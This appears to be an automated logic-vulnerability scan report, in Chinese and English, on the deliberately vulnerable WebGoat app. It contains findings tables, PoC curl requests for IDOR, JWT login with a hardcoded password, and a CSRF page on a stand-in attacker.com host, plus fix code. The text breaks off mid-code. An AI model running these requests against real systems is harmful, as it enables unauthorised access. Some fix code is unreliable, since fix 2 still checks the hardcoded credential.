# 逻辑漏洞扫描报告
生成时间: 2026-07-08 13:40:57
> **证据层级说明**（非「召回率」，而是结论依据的深度）：
> **L1**=Joern 污点流/硬回溯/扩展查询得到的**代码流**证据；
> **L2**=config.h/CMakeLists/pom/yml/Security 等**静态文件**补证（FileTool）；
> **L3**=HTTP/鉴权/业务规则等**运行态**验证（本扫描默认未做则标「待动态验证」）。

## 摘要
- Joern 提取候选总数: 737
- 进入 LLM 分析数: 100 (上限 100)
- 因上限未分析: 637
- 确认漏洞: 60
- 否决候选: 30
- 待 L2 补证 (inconclusive): 7
- CWE 聚焦: 862, 306, 639, 863, 285, 836, 899, 841, 287, 284, 798, 341, 330, 200, 352, 367, 840, 918, 22, 89, 79, 611, 502, 78, 269, 276, 307, 362, 384, 521, 610, 613, 640, 915

## 候选漏斗（按类型）
- 提取后: idor_pathvar=166, missing_auth=102, public_endpoint=98, csrf_gap=80, workflow_bypass=60, hardcoded_cred=50, info_leak_response=31, idor=23, admin_no_auth=22, jwt_weakness=22, jwt_endpoint=10, toctou_risk=10, auth_weakness=9, brute_force_risk=8, info_leak=6, sqli_risk=6, xss_output_risk=6, mass_assignment_risk=5, deser_risk=3, file_ops=3, idor_profile=3, incorrect_permissions=3, password_recovery_risk=3, weak_password_requirements=3, mass_exposure=2, ssrf_risk=2, xxe_risk=1
- 已分析: admin_no_auth=9, idor=9, idor_pathvar=9, auth_weakness=8, brute_force_risk=8, csrf_gap=8, jwt_endpoint=8, missing_auth=8, toctou_risk=8, workflow_bypass=8, mass_assignment_risk=5, idor_profile=3, incorrect_permissions=3, password_recovery_risk=3, weak_password_requirements=3

## ⚠️ 漏报风险提示
- 有 **637** 个候选因 `max_candidates` 未进入 LLM。
- 可在 `logic_scan_settings.py` 或 `.env` 的 `LOGIC_SCAN_MAX_CANDIDATES` 调大上限。

## 结构化摘要
| finding_id | CWE | 类型 | 判定 | L1 | L2 | L3 | 位置 |
|------------|-----|------|------|----|----|-----|------|
| `admin_348` | CWE-862 | admin_no_auth | ❌ 否 | present | present | not_verified | `src/main/java/org/owasp/webgoat/container/service/RestartLessonService.java`:34 |
| `idor_103` | CWE-639 | idor | ❌ 否 | present | absent | not_applicable | `src/it/java/org/owasp/webgoat/integration/AccessControlIntegrationTest.java`:46 |
| `idorpv_182` | CWE-639 | idor_pathvar | ✅ 是 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/container/service/LessonInfoService.java`:20 |
| `jwtep_392` | CWE-287 | jwt_endpoint | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/JWTRefreshEndpoint.java`:49 |
| `idprof_402` | CWE-639 | idor_profile | ✅ 是 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/idor/IDOREditOtherProfile.java`:40 |
| `csrf_436` | CWE-352 | csrf_gap | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/container/users/RegistrationController.java`:39 |
| `workflow_528` | CWE-841 | workflow_bypass | ✅ 是 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/authbypass/VerifyAccount.java`:41 |
| `authweak_588` | CWE-287 | auth_weakness | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/challenge5/Assignment5.java`:30 |
| `perm_618` | CWE-276 | incorrect_permissions | ❌ 否 | present | absent | not_applicable | `src/main/java/org/owasp/webgoat/lessons/sqlinjection/mitigation/SqlInjectionLesson10b.java`:42 |
| `brute_621` | CWE-307 | brute_force_risk | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/challenge5/Assignment5.java`:30 |
| `weakpwd_629` | CWE-521 | weak_password_requirements | ❌ 否 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/passwordreset/ResetLinkAssignment.java`:100 |
| `pwdrecov_632` | CWE-640 | password_recovery_risk | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/challenge7/Assignment7.java`:52 |
| `massassign_635` | CWE-915 | mass_assignment_risk | ✅ 是 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/idor/IDOREditOtherProfile.java`:40 |
| `auth_9` | CWE-862 | missing_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/challenge5/Assignment5.java`:41 |
| `toctou_516` | CWE-367 | toctou_risk | ❌ 否 | present | absent | not_applicable | `src/it/java/org/owasp/webgoat/integration/CSRFIntegrationTest.java`:60 |
| `admin_349` | CWE-862 | admin_no_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/container/users/RegistrationController.java`:39 |
| `idor_105` | CWE-639 | idor | ❌ 否 | present | absent | not_applicable | `src/it/java/org/owasp/webgoat/integration/CSRFIntegrationTest.java`:41 |
| `idorpv_183` | CWE-639 | idor_pathvar | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/FlagController.java`:27 |
| `jwtep_393` | CWE-287 | jwt_endpoint | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/JWTRefreshEndpoint.java`:83 |
| `idprof_403` | CWE-639 | idor_profile | ✅ 是 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/pathtraversal/ProfileUploadRetrieval.java`:78 |
| `csrf_437` | CWE-352 | csrf_gap | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/authbypass/VerifyAccount.java`:41 |
| `workflow_529` | CWE-841 | workflow_bypass | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/bypassrestrictions/BypassRestrictionsFieldRestrictions.java`:20 |
| `authweak_589` | CWE-287 | auth_weakness | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/hijacksession/HijackSessionAssignment.java`:47 |
| `perm_619` | CWE-276 | incorrect_permissions | ❌ 否 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/sqlinjection/mitigation/SqlInjectionLesson10b.java`:90 |
| `brute_622` | CWE-307 | brute_force_risk | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/hijacksession/HijackSessionAssignment.java`:47 |
| `weakpwd_630` | CWE-521 | weak_password_requirements | ❌ 否 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/passwordreset/SimpleMailAssignment.java`:59 |
| `pwdrecov_633` | CWE-640 | password_recovery_risk | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/passwordreset/ResetLinkAssignment.java`:84 |
| `massassign_636` | CWE-915 | mass_assignment_risk | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java`:64 |
| `auth_28` | CWE-862 | missing_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/cryptography/HashingAssignment.java`:40 |
| `toctou_517` | CWE-367 | toctou_risk | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/container/users/UserService.java`:42 |
| `admin_350` | CWE-862 | admin_no_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/container/users/RegistrationController.java`:55 |
| `idor_106` | CWE-639 | idor | ❌ 否 | present | absent | not_applicable | `src/it/java/org/owasp/webgoat/integration/CSRFIntegrationTest.java`:63 |
| `idorpv_184` | CWE-639 | idor_pathvar | ✅ 是 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/challenge7/Assignment7.java`:52 |
| `jwtep_394` | CWE-287 | jwt_endpoint | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/JWTRefreshEndpoint.java`:108 |
| `idprof_404` | CWE-639 | idor_profile | ❌ 否 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/pathtraversal/ProfileZipSlip.java`:94 |
| `csrf_438` | CWE-352 | csrf_gap | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/bypassrestrictions/BypassRestrictionsFieldRestrictions.java`:20 |
| `workflow_530` | CWE-841 | workflow_bypass | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/bypassrestrictions/BypassRestrictionsFrontendValidation.java`:20 |
| `authweak_590` | CWE-287 | auth_weakness | ❌ 否 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/insecurelogin/InsecureLoginTask.java`:27 |
| `perm_620` | CWE-276 | incorrect_permissions | ❌ 否 | present | absent | not_applicable | `src/main/java/org/owasp/webgoat/lessons/sqlinjection/mitigation/SqlInjectionLesson10b.java`:104 |
| `brute_623` | CWE-307 | brute_force_risk | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/insecurelogin/InsecureLoginTask.java`:27 |
| `weakpwd_631` | CWE-521 | weak_password_requirements | ⚠️ inconclusive | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/sqlinjection/advanced/SqlInjectionChallenge.java`:34 |
| `pwdrecov_634` | CWE-640 | password_recovery_risk | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/passwordreset/SimpleMailAssignment.java`:59 |
| `massassign_637` | CWE-915 | mass_assignment_risk | ❌ 否 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/xxe/BlindSendFileAssignment.java`:60 |
| `auth_31` | CWE-862 | missing_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/JWTRefreshEndpoint.java`:132 |
| `toctou_518` | CWE-367 | toctou_risk | ❌ 否 | present | absent | not_applicable | `src/main/java/org/owasp/webgoat/lessons/clientsidefiltering/Salaries.java`:40 |
| `admin_351` | CWE-862 | admin_no_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/container/users/Scoreboard.java`:55 |
| `idor_107` | CWE-639 | idor | ❌ 否 | present | absent | not_applicable | `src/it/java/org/owasp/webgoat/integration/CSRFIntegrationTest.java`:64 |
| `idorpv_185` | CWE-639 | idor_pathvar | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/challenge8/Assignment8.java`:39 |
| `jwtep_395` | CWE-287 | jwt_endpoint | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/JWTSecretKeyEndpoint.java`:43 |
| `csrf_439` | CWE-352 | csrf_gap | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/bypassrestrictions/BypassRestrictionsFrontendValidation.java`:20 |
| `workflow_531` | CWE-841 | workflow_bypass | ⚠️ inconclusive | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/challenge1/Assignment1.java`:28 |
| `authweak_591` | CWE-287 | auth_weakness | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/JWTSecretKeyEndpoint.java`:59 |
| `brute_624` | CWE-307 | brute_force_risk | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/JWTSecretKeyEndpoint.java`:59 |
| `massassign_638` | CWE-915 | mass_assignment_risk | ❌ 否 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/xxe/ContentTypeAssignment.java`:45 |
| `auth_33` | CWE-862 | missing_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java`:68 |
| `toctou_519` | CWE-367 | toctou_risk | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/pathtraversal/ProfileUploadBase.java`:57 |
| `admin_352` | CWE-862 | admin_no_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java`:33 |
| `idor_108` | CWE-639 | idor | ❌ 否 | present | absent | not_applicable | `src/it/java/org/owasp/webgoat/integration/CSRFIntegrationTest.java`:71 |
| `idorpv_186` | CWE-639 | idor_pathvar | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/clientsidefiltering/ShopEndpoint.java`:80 |
| `csrf_440` | CWE-352 | csrf_gap | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/FlagController.java`:27 |
| `workflow_532` | CWE-841 | workflow_bypass | ⚠️ inconclusive | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/chromedevtools/NetworkDummy.java`:33 |
| `authweak_592` | CWE-287 | auth_weakness | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/JWTVotesEndpoint.java`:103 |
| `brute_625` | CWE-307 | brute_force_risk | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/passwordreset/ResetLinkAssignment.java`:69 |
| `massassign_639` | CWE-915 | mass_assignment_risk | ❌ 否 | present | absent | not_applicable | `src/main/java/org/owasp/webgoat/lessons/xxe/SimpleXXE.java`:48 |
| `auth_34` | CWE-862 | missing_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/sqlinjection/advanced/SqlInjectionChallenge.java`:42 |
| `toctou_520` | CWE-367 | toctou_risk | ⚠️ inconclusive | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/pathtraversal/ProfileUploadRetrieval.java`:78 |
| `admin_353` | CWE-862 | admin_no_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java`:48 |
| `idor_109` | CWE-639 | idor | ❌ 否 | present | absent | not_applicable | `src/it/java/org/owasp/webgoat/integration/CSRFIntegrationTest.java`:108 |
| `csrf_441` | CWE-352 | csrf_gap | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/challenge1/Assignment1.java`:28 |
| `workflow_533` | CWE-841 | workflow_bypass | ⚠️ inconclusive | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/chromedevtools/NetworkLesson.java`:30 |
| `authweak_593` | CWE-287 | auth_weakness | ❌ 否 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/passwordreset/ResetLinkAssignment.java`:69 |
| `brute_626` | CWE-307 | brute_force_risk | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/passwordreset/SimpleMailAssignment.java`:41 |
| `auth_35` | CWE-862 | missing_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/sqlinjection/advanced/SqlInjectionChallenge.java`:50 |
| `toctou_521` | CWE-367 | toctou_risk | ⚠️ inconclusive | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/sqlinjection/advanced/SqlInjectionChallenge.java`:34 |
| `admin_354` | CWE-862 | admin_no_auth | ❌ 否 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java`:54 |
| `idor_110` | CWE-639 | idor | ⚠️ inconclusive | present | absent | not_applicable | `src/it/java/org/owasp/webgoat/integration/CSRFIntegrationTest.java`:202 |
| `idorpv_188` | CWE-639 | idor_pathvar | ✅ 是 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/idor/IDORViewOtherProfile.java`:39 |
| `jwtep_398` | CWE-287 | jwt_endpoint | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/JWTVotesEndpoint.java`:126 |
| `csrf_442` | CWE-352 | csrf_gap | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/challenge5/Assignment5.java`:30 |
| `workflow_534` | CWE-841 | workflow_bypass | ❌ 否 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/cia/CIAQuiz.java`:24 |
| `authweak_594` | CWE-287 | auth_weakness | ❌ 否 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/passwordreset/SimpleMailAssignment.java`:41 |
| `brute_627` | CWE-307 | brute_force_risk | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/spoofcookie/SpoofCookieAssignment.java`:46 |
| `auth_70` | CWE-862 | missing_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/container/users/Scoreboard.java`:57 |
| `toctou_522` | CWE-367 | toctou_risk | ❌ 否 | present | absent | not_applicable | `src/main/java/org/owasp/webgoat/lessons/sqlinjection/introduction/SqlInjectionLesson10.java`:47 |
| `admin_355` | CWE-862 | admin_no_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java`:64 |
| `idor_111` | CWE-639 | idor | ❌ 否 | present | absent | not_applicable | `src/it/java/org/owasp/webgoat/integration/ChallengeIntegrationTest.java`:71 |
| `idorpv_189` | CWE-639 | idor_pathvar | ✅ 是 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/JWTVotesEndpoint.java`:154 |
| `jwtep_399` | CWE-287 | jwt_endpoint | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/JWTVotesEndpoint.java`:154 |
| `csrf_443` | CWE-352 | csrf_gap | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/challenge7/Assignment7.java`:60 |
| `workflow_535` | CWE-841 | workflow_bypass | ❌ 否 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/clientsidefiltering/ClientSideFilteringAssignment.java`:27 |
| `authweak_595` | CWE-287 | auth_weakness | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/spoofcookie/SpoofCookieAssignment.java`:46 |
| `brute_628` | CWE-307 | brute_force_risk | ❌ 否 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/sqlinjection/advanced/SqlInjectionChallengeLogin.java`:26 |
| `auth_75` | CWE-862 | missing_auth | ✅ 是 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/challenges/challenge7/Assignment7.java`:68 |
| `toctou_523` | CWE-367 | toctou_risk | ❌ 否 | present | partial | not_verified | `src/main/java/org/owasp/webgoat/lessons/xxe/BlindSendFileAssignment.java`:46 |
| `admin_356` | CWE-862 | admin_no_auth | ❌ 否 | present | present | not_verified | `src/main/java/org/owasp/webgoat/lessons/sqlinjection/introduction/SqlInjectionLesson5.java`:53 |
| `idor_112` | CWE-639 | idor | ❌ 否 | present | absent | not_applicable | `src/it/java/org/owasp/webgoat/integration/ChallengeIntegrationTest.java`:113 |
| `idorpv_190` | CWE-639 | idor_pathvar | ✅ 是 | present | absent | not_verified | `src/main/java/org/owasp/webgoat/lessons/jwt/claimmisuse/JWTHeaderJKUEndpoint.java`:40 |

## 确认漏洞（PoC / 代码流 / 修复代码）

### [1] CWE-639 — `idorpv_182`
> LessonInfoService.getLessonInfo 方法通过路径变量 {lesson} 直接查询课程信息，未校验当前用户是否拥有访问该 lesson 的权限，存在水平越权（IDOR/CWE-639）漏洞。

#### 证据层级
| L1 | present | L2 | partial | L3 | not_verified |

#### 代码/调用流
HTTP GET /service/lessoninfo.mvc/{lesson} → LessonInfoService.getLessonInfo(@PathVariable lessonName) [LessonInfoService.java:20] → course.getLessonByName(lessonName) → returns Lesson → new LessonInfoModel(lesson.getTitle(), false, false, false)

#### 漏洞利用（PoC）
1. 确保已登录 WebGoat（任意用户，如 guest/password）
2. 发送请求：curl -X GET '{BASE_URL}/service/lessoninfo.mvc/insecure-login' -H 'Cookie: JSESSIONID=xxx' （替换为有效会话）
3. 观察响应：返回 {"title":"Insecure Login","completed":false,"locked":false,"enabled":false}
4. 尝试越权访问管理员 lesson：curl -X GET '{BASE_URL}/service/lessoninfo.mvc/admin-panel' -H 'Cookie: JSESSIONID=xxx'
→ 若返回非 403/404 且含 title 字段（如 "Admin Panel"），即确认 IDOR。注：lesson 名称可从 lessons/ 目录枚举（如 src/main/resources/lessons/admin-panel.xml），WebGoat 未限制 lesson 名称白名单。

#### 修复代码
```
@GetMapping(path = "/service/lessoninfo.mvc/{lesson}")
public @ResponseBody LessonInfoModel getLessonInfo(@PathVariable("lesson") LessonName lessonName, @AuthenticationPrincipal UserDetails userDetails) {
    var lesson = course.getLessonByName(lessonName);
    if (lesson == null || !course.isUserAuthorizedForLesson(userDetails.getUsername(), lessonName)) {
        throw new AccessDeniedException("Access denied to lesson: " + lessonName);
    }
    return new LessonInfoModel(lesson.getTitle(), false, false, false);
}
```

**说明**: 必须在方法内注入当前认证主体（@AuthenticationPrincipal），并调用业务层授权检查（如 course.isUserAuthorizedForLesson()）验证用户对该 lesson 的访问权限；禁止仅依赖路径参数直接查询。
---

### [2] CWE-287 — `jwtep_392`
> JWT refresh login endpoint /JWT/refresh/login performs weak credential comparison using hardcoded password and plain string equals(), enabling direct authentication bypass without prior session or token.

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /JWT/refresh/login → JWTRefreshEndpoint.follow() [src/main/java/org/owasp/webgoat/lessons/jwt/JWTRefreshEndpoint.java:49] → extracts user/password from JSON → compares against hardcoded 'Jerry'/'bm5nhSkxCXZkKRy4' → calls createNewTokens() → generates HS512-signed JWT with 'admin=false' claim

#### 漏洞利用（PoC）
1. Send HTTP POST request to {BASE_URL}/JWT/refresh/login with raw JSON body.
2. Use exact hardcoded credentials: user='Jerry', password='bm5nhSkxCXZkKRy4'.
3. Observe 200 OK response containing 'access_token' and 'refresh_token'.

```
curl -X POST '{BASE_URL}/JWT/refresh/login' \
  -H 'Content-Type: application/json' \
  -d '{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}'
```

Expected response: HTTP 200 with JSON containing 'access_token' (HS512-signed JWT) and 'refresh_token' (random alphabetic string). This grants authenticated access to downstream JWT-protected endpoints like /JWT/refresh/checkout — confirming full authentication bypass.

#### 修复代码
```
@PostMapping(
    value = "/JWT/refresh/login",
    consumes = MediaType.APPLICATION_JSON_VALUE,
    produces = MediaType.APPLICATION_JSON_VALUE)
@ResponseBody
public ResponseEntity follow(@RequestBody(required = false) Map<String, Object> json) {
    if (json == null) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
    }
    String user = (String) json.get("user");
    String password = (String) json.get("password");

    // ✅ Enforce authentication: reject unauthenticated calls
    Authentication auth = SecurityContextHolder.getContext().getAuthentication();
    if (auth == null || !auth.isAuthenticated()) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
    }

    // ✅ Replace hardcoded check with secure lookup & constant-time compare
    if ("Jerry".equalsIgnoreCase(user) && PASSWORD.equals(password)) {
        return ok(createNewTokens(user));
    }
    return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
}
```

**说明**: Add explicit authentication check via SecurityContextHolder before credential validation. Better yet: migrate to Spring Security’s standard authentication flow (e.g., custom UsernamePasswordAuthenticationFilter) instead of exposing raw credential endpoints. Remove hardcoded password and use BCryptPasswordEncoder for credential storage/verification.
---

### [3] CWE-639 — `idprof_402`
> CWE-639 IDOR：/IDOR/profile/{userId} 端点未校验请求者与目标 userId 的所有权关系，允许已认证用户篡改路径参数越权编辑他人档案。

#### 证据层级
| L1 | present | L2 | partial | L3 | not_verified |

#### 代码/调用流
HTTP PUT /IDOR/profile/2 → IDOREditOtherProfile.completed() [src/main/java/org/owasp/webgoat/lessons/idor/IDOREditOtherProfile.java:40] → userSessionData.getValue("idor-authenticated-user-id") 获取 authUserId → new UserProfile(userId) 构造目标档案 → userSubmittedProfile.getColor()/getRole() 覆盖目标档案属性 → userSessionData.setValue("idor-updated-other-profile", currentUserProfile) 持久化越权修改

#### 漏洞利用（PoC）
1. 登录 WebGoat（如 Tom & Jerry 用户），获取有效会话 Cookie（如 JSESSIONID=xxx）
2. 发送恶意请求：curl -X PUT 'http://localhost:8080/WebGoat/IDOR/profile/2' \
   -H 'Content-Type: application/json' \
   -H 'Cookie: JSESSIONID=xxx' \
   -d '{"userId":"2","color":"red","role":1}'
3. 观察响应：若返回 success 且 feedback="idor.edit.profile.success1"，则成功越权编辑用户2档案（role≤1且color=red）；若返回 failure1/failure2/failure3，则仍属越权尝试（因服务端接受并处理了非自身ID），证明IDOR存在。

#### 修复代码
```
@PutMapping(path = "/IDOR/profile/{userId}", consumes = "application/json")
@ResponseBody
public AttackResult completed(
    @PathVariable("userId") String userId, 
    @RequestBody UserProfile userSubmittedProfile) {

    String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
    // ✅ ADD: Enforce ownership check before processing
    if (!userId.equals(authUserId)) {
        return failed(this)
            .feedback("idor.edit.profile.forbidden")
            .build();
    }
    // ... rest of original logic (only for own profile)
}
```

**说明**: 在方法入口处强制校验路径参数 userId 是否等于当前认证用户 ID（authUserId），拒绝所有跨用户请求。此修复符合最小权限原则，且与 WebGoat 教学目标一致（该 lesson 本意即演示 IDOR，修复后应移至其他 lesson 或添加 bypass 检查）。
---

### [4] CWE-352 — `csrf_436`
> POST /register.mvc 是一个状态变更端点（创建用户+登录），未启用 CSRF 防护，且被 SecurityFilterChain 显式配置为 permitAll，允许匿名调用，满足 CWE-352 所有判定条件。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /register.mvc → RegistrationController.registration() [src/main/java/org/owasp/webgoat/container/users/RegistrationController.java:39] → userValidator.validate() → userService.addUser() [via dependency injection] → request.login() → 新建 JSESSIONID 并建立认证上下文

#### 漏洞利用（PoC）
1. 攻击者准备恶意页面（attacker.com/register-poc.html）：\n<html>\n  <body>\n    <form action="http://localhost:8080/register.mvc" method="POST">\n      <input type="hidden" name="username" value="hacker123" />\n      <input type="hidden" name="password" value="p@ssw0rd" />\n      <input type="hidden" name="confirmPassword" value="p@ssw0rd" />\n      <input type="submit" value="Click to claim prize!" />\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>\n2. 受害者（已登录 WebGoat）访问 attacker.com/register-poc.html；\n3. 浏览器自动携带其有效 JSESSIONID 向 localhost:8080/register.mvc 发起 POST（因 SameSite=Lax 允许 GET/POST 表单提交，且此处未配置 SameSite=Strict）；\n4. 服务端执行 registration()：创建用户 hacker123/p@ssw0rd，登出受害者原会话，并将新用户登录态写入响应 Cookie；\n5. 受害者后续请求将使用 hacker123 账户权限，导致会话接管与权限提升。

#### 修复代码
```
@PostMapping("/register.mvc")\npublic String registration(\n    @ModelAttribute("userForm") @Valid UserForm userForm,\n    BindingResult bindingResult,\n    HttpServletRequest request,\n    HttpServletResponse response)\n    throws ServletException {\n  // ✅ Add CSRF token validation manually (if CSRF disabled globally)\n  String csrfToken = request.getParameter("_csrf");\n  if (!isCsrfTokenValid(request, csrfToken)) {\n    throw new IllegalStateException("Invalid or missing CSRF token");\n  }\n\n  userValidator.validate(userForm, bindingResult);\n\n  if (bindingResult.hasErrors()) {\n    return "registration";\n  }\n\n  Authentication auth = SecurityContextHolder.getContext().getAuthentication();\n  if (auth != null) {\n    new SecurityContextLogoutHandler().logout(request, response, auth);\n  }\n\n  userService.addUser(userForm.getUsername(), userForm.getPassword());\n  request.login(userForm.getUsername(), userForm.getPassword());\n\n  return "redirect:/attack";\n}\n\nprivate boolean isCsrfTokenValid(HttpServletRequest request, String token) {\n  CsrfToken csrfTokenFromSession = (CsrfToken) request.getSession().getAttribute(CsrfToken.class.getName());\n  return csrfTokenFromSession != null && Objects.equals(csrfTokenFromSession.getToken(), token);\n}
```

**说明**: ✅ 最佳实践：移除 WebSecurityConfig 中 .csrf(csrf -> csrf.disable())，启用默认 Spring Security CSRF 保护（自动注入 _csrf 表单字段并校验）。若必须禁用全局 CSRF（如 API 场景），则需对 /register.mvc 单独添加 token 校验逻辑（如 fix_code 所示），或改用 stateless 认证（JWT）并要求 Authorization header。
---

### [5] CWE-841 — `workflow_528`
> VerifyAccount.completed() 允许未完成前置验证流程的用户直接提交任意 userId 的安全问题答案，绕过账户注册/激活工作流，实现账户身份冒用与状态篡改。

#### 证据层级
| L1 | present | L2 | partial | L3 | not_verified |

#### 代码/调用流
HTTP POST /auth-bypass/verify-account → VerifyAccount.completed() [src/main/java/org/owasp/webgoat/lessons/authbypass/VerifyAccount.java:41] → parseSecQuestions(req) [line 67] → AccountVerificationHelper.verifyAccount(Integer.valueOf(userId), submittedAnswers) [line 55] → (downstream DB/Logic check of security answers)

#### 漏洞利用（PoC）
1. 启动 WebGoat 并访问 /WebGoat/auth-bypass/start (获取 lesson session)
2. 使用任意低权限或未注册用户（甚至匿名）发起以下请求：
curl -X POST '{BASE_URL}/WebGoat/auth-bypass/verify-account' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'userId=1' \
  -d 'verifyMethod=security-questions' \
  -d 'secQuestion1=mother's maiden name' \
  -d 'secQuestion1Answer=Smith' \
  -d 'secQuestion2=favorite pet' \
  -d 'secQuestion2Answer=Fluffy'
3. 观察响应：若返回 {"feedback":"verify-account.success","lessonCompleted":true,...}，则 userId=1 账户被非法标记为已验证（userSessionData.setValue("account-verified-id", "1")），攻击者后续可凭此绕过该账户的其他保护逻辑。

#### 修复代码
```
@PostMapping(path = "/auth-bypass/verify-account", produces = {"application/json"})
@ResponseBody
public AttackResult completed(@RequestParam String userId, @RequestParam String verifyMethod, HttpServletRequest req) throws ServletException, IOException {
    // Enforce ownership: only allow verification of current user's own account
    String currentUserId = (String) userSessionData.getValue("current-user-id");
    if (!Objects.equals(currentUserId, userId)) {
        return failed(this).feedback("verify-account.forbidden").build();
    }
    // Enforce state: verify account must be in pending-verification state
    String accountStatus = (String) userSessionData.getValue("account-status-" + userId);
    if (!"pending-verification".equals(accountStatus)) {
        return failed(this).feedback("verify-account.invalid-state").build();
    }
    AccountVerificationHelper verificationHelper = new AccountVerificationHelper();
    Map<String, String> submittedAnswers = parseSecQuestions(req);
    if (verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)) {
